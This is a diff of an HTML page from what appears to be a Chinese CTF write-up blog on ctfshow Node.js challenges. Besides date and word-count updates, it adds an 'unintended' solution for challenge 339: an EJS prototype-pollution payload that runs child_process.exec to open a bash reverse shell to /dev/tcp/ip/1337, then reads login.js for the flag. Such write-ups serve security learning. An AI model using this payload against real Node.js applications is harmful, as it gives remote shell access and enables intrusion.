@@ -412,14 +412,14 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2022-02-13
+                    2022-08-22
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    237
+                    305
                 </div>
                 
 
@@ -464,7 +464,14 @@
 <p>条件是：<code>secert.ctfshow==='36dboy'</code>，但utils.copy函数是关键：它会将<code>object1[key] = object2[key]</code>从而实现原型链的污染</p>
 <p><img src="/2022/01/22/ctfshow-node.js/image-20211127102332550.png" alt="image-20211127102332550"></p>
 <p><img src="/2022/01/22/ctfshow-node.js/image-20211127102150846.png" alt="image-20211127102150846"></p>
-<h2 id="339"><a href="#339" class="headerlink" title="339"></a>339</h2>
+<h2 id="339"><a href="#339" class="headerlink" title="339"></a>339</h2><h3 id="非预期"><a href="#非预期" class="headerlink" title="非预期"></a>非预期</h3><p> ejs rce <a target="_blank" rel="noopener" href="https://xianbeil.github.io/2022/05/28/ejs%E6%A8%A1%E6%9D%BFrce%E7%9A%84%E5%88%9D%E6%8E%A2/">https://xianbeil.github.io/2022/05/28/ejs%E6%A8%A1%E6%9D%BFrce%E7%9A%84%E5%88%9D%E6%8E%A2/</a></p>
+<pre class="line-numbers language-none"><code class="language-none">payload :{"__proto__":{"outputFunctionName":"_tmp1;global.process.mainModule.require('child_process').exec('bash -c \"bash -i &gt;&amp; /dev/tcp/ip/1337 0&gt;&amp;1\"');var __tmp2"}
+}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p><img src="/2022/01/22/ctfshow-node.js/image-20220822155411322.png" alt="image-20220822155411322"></p>
+<p>rce后 cat login.js 就可以得到flag</p>
+<p><img src="/2022/01/22/ctfshow-node.js/image-20220822155514614.png" alt="image-20220822155514614"></p>
+<h3 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h3>
                 
             </div>
             <hr/>
@@ -994,7 +1001,7 @@
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">20.7k</span>
+                        class="white-color">20.8k</span>
             
             
             
